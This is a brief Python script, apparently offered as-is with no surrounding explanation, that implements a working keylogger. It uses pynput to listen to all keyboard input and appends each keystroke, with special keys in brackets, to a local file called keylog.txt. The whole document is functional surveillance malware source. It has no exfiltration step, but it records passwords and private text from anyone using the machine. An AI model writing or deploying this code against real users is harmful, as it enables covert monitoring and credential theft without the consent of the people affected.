from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def run():
    # Starts the keylogger and waits for keys to be pressed
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    run()

